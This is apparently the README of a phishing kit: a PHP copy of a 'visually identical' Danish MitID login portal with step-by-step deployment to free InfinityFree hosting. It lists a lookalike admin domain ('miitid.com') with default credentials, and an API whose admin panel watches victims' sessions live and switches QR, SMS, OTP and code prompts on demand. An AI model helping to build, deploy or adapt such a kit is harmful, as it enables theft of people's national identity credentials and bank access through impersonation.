# MitID — PHP / LAMP Edition (Optimized for InfinityFree)

This is the complete, 100% functional, visually identical PHP/LAMP version of the **MitID** authentication portal and real-time admin session control panel.

Converted from the Node.js/Express/PostgreSQL stack to **PHP 7.4+ / 8.x / MySQL / MariaDB (with zero-config SQLite auto-fallback)**, tailored specifically for shared hosting environments like **InfinityFree**, cPanel, Plesk, Apache, and LAMP stacks.

---

## 🚀 Key Architectural Highlights

1. **1:1 Pixel-Perfect UI**:
   - The exact same frontend look, feel, responsive layout, animations, icons, and Danish text strings.
   - Built with modern HTML5, CSS3 (Tailwind styles compiled), and JavaScript.
   - Full support for both User MitID Login flow and the `#admin` real-time control panel.

2. **No Persistent Background Daemons Required**:
   - Shared hosting platforms like InfinityFree do not allow long-running Node.js background daemons or raw WebSocket listeners.
   - The application features an intelligent **real-time event queue & polling engine** (`/api/ws/poll` and `/api/ws/send`).
   - Sub-second updates (750ms latency) give users and admins an instant, responsive live experience without WebSocket connection drops, proxy blocks, or daemon crashes.

3. **Pure PHP Authentication & Security**:
   - Self-contained **JWT (JSON Web Token) HS256** encoder/decoder with zero Composer dependencies.
   - Standard PHP `password_hash()` and `password_verify()` with Bcrypt (cost 10) for admin password security.
   - Apache `.htaccess` rules prevent direct access to configuration files, SQLite data, and SQL dumps.

4. **Dual Database Engine (MySQL + SQLite Fallback)**:
   - **Production (InfinityFree)**: Standard MySQL / MariaDB via PDO.
   - **Local Testing / Fallback**: If MySQL is not running or unreachable, the system automatically initializes a local SQLite database in `data/mitid.sqlite`. You can test immediately with `php -S localhost:8080` out of the box!
   - Automated self-migration creates tables and seeds the default admin user on first run.

---

## 📁 Directory Structure

```text
php/
├── .htaccess                      # Apache rewrite rules for clean URLs & SPA routing
├── index.php                      # Main entry point: serves UI & SPA routes
├── install.php                    # Web-based database installer wizard for InfinityFree
├── database.sql                   # MySQL schema & seed data for phpMyAdmin import
├── brabdlogo.webp                 # MitID & partner brand logo asset
├── README.md                      # This deployment and configuration guide
├── assets/                        # Compiled production frontend assets (JS & CSS)
│   ├── index-kdrmnbR8.js          # Core client application & admin dashboard
│   └── index-mvarxTuy.css         # Complete compiled Tailwind styles
├── config/
│   ├── config.php                 # Central settings (DB credentials, JWT secret, Admin defaults)
│   └── db.php                     # PDO connection manager (MySQL & SQLite auto-fallback)
├── api/
│   ├── index.php                  # Central API router & dispatcher
│   ├── helpers.php                # JSON response formatters & CORS handling
│   ├── jwt.php                    # HS256 JWT encoder, decoder & auth guard
│   ├── auth.php                   # User session endpoints (/api/auth/*)
│   ├── admin_auth.php             # Admin authentication (/api/admin/auth/*)
│   ├── admin_sessions.php         # Admin session controls (/api/admin/session/*)
│   └── ws.php                     # Real-time event polling engine (/api/ws/*)
└── data/
    └── .gitkeep                   # Data folder for local SQLite database fallback
```

---

## 🔑 Default Credentials

- **Client Portal**: `http://your-domain/`
- **Admin Panel**: `http://your-domain/#admin`
- **Default Admin Email**: `admin@miitid.com`
- **Default Admin Password**: `Miitid@Admin2026!`

*(You can change the admin password at any time inside the Admin Dashboard using the "Skift adgangskode" modal, or via `config/config.php` / `install.php`).*

---

## 🌐 Step-by-Step Deployment to InfinityFree

InfinityFree provides free web hosting with PHP and MySQL. Follow these simple steps:

### Step 1: Create an Account & Domain on InfinityFree
1. Sign in to your [InfinityFree Client Area](https://dash.infinityfree.com/).
2. Click **Create Account**.
3. Choose a domain name (e.g. `yourname.infinityfreeapp.com` or `yourname.epizy.com`).
4. Wait a few moments for the account to be provisioned.

### Step 2: Create a MySQL Database
1. In the InfinityFree Control Panel (VistaPanel), open **MySQL Databases**.
2. Under "Create New Database", enter a name (e.g. `mitid`) and click **Create Database**.
3. Note your database connection details shown on that page:
   - **MySQL Host Name** (e.g. `sql123.infinityfree.com` or `sqlxxx.epizy.com`)
   - **MySQL User Name** (e.g. `epiz_12345678`)
   - **MySQL Password** (your InfinityFree account password)
   - **MySQL Database Name** (e.g. `epiz_12345678_mitid`)
   - **Port**: `3306`

### Step 3: Upload the Files
1. In VistaPanel, click **Online File Manager** (or connect via FTP using FileZilla).
2. Open the **`htdocs/`** directory.
3. Delete any default placeholder files (like `default2.html`).
4. Upload all files and folders from this `php/` folder directly into `htdocs/`:
   - `.htaccess`
   - `index.php`
   - `install.php`
   - `database.sql`
   - `brabdlogo.webp`
   - `assets/`
   - `config/`
   - `api/`
   - `data/`

### Step 4: Initialize the Database

You have two easy options:

#### Option A: Using the Visual Web Installer (Recommended)
1. Open your browser and navigate to: `http://your-domain.infinityfreeapp.com/install.php`
2. Enter the MySQL Host, Database Name, Username, and Password from Step 2.
3. Click **Run Database Setup & Install**.
4. The installer will create all tables, verify your environment, save `config/config.php`, and seed the admin user!

#### Option B: Via phpMyAdmin & `config/config.php`
1. In VistaPanel, open **phpMyAdmin** and select your database.
2. Click the **Import** tab, choose `database.sql`, and click **Go**.
3. Open `config/config.php` in the File Manager and update the database credentials:
   ```php
   'host' => 'sqlxxx.epizy.com',
   'database' => 'epiz_12345678_mitid',
   'username' => 'epiz_12345678',
   'password' => 'your_password',
   ```

### Step 5: Test the Live Application
- User flow: Visit `http://your-domain.infinityfreeapp.com/`
- Admin panel: Visit `http://your-domain.infinityfreeapp.com/#admin`

---

## 💻 Running & Testing Locally

You can test the entire PHP application on your local machine using PHP's built-in web server. Because the application includes an automatic SQLite fallback, **you don't even need a running MySQL server locally**!

1. Open PowerShell / Terminal in the `php/` folder:
   ```powershell
   cd c:\Users\User\OneDrive\Desktop\work\php
   ```
2. Start the built-in server:
   ```powershell
   php -S localhost:8080
   ```
3. Open your browser:
   - Client Login: `http://localhost:8080/`
   - Admin Panel: `http://localhost:8080/#admin`
   - API Health: `http://localhost:8080/api/health`

---

## 📡 API Endpoint Reference

| Method | Endpoint | Description | Auth Required |
|--------|----------|-------------|---------------|
| `GET` | `/api/health` | Service health check | No |
| `POST` | `/api/auth/init` | Start login session (`userId`) | No |
| `GET` | `/api/auth/session/:id` | Get session status and details | No |
| `POST` | `/api/auth/verify/:id` | Confirm user session | No |
| `POST` | `/api/admin/auth/login` | Admin login with JWT issue | No |
| `GET` | `/api/admin/auth/verify` | Validate admin JWT token | Yes (Bearer) |
| `POST` | `/api/admin/auth/change-password` | Update admin password | Yes (Bearer) |
| `GET` | `/api/admin/sessions` | List active sessions | Yes (Bearer) |
| `GET` | `/api/admin/session/:id` | Get single session | Yes (Bearer) |
| `PATCH` | `/api/admin/session/:id/qr` | Toggle QR code / image | Yes (Bearer) |
| `PATCH` | `/api/admin/session/:id/status`| Toggle SMS / OTP / Kode status | Yes (Bearer) |
| `GET` | `/api/admin/session/:id/log` | Fetch activity log | Yes (Bearer) |
| `DELETE`| `/api/admin/session/:id` | Delete session & logs | Yes (Bearer) |
| `POST` | `/api/ws/send` | Send real-time event / action | No |
| `GET` | `/api/ws/poll` | Poll for real-time messages | No |
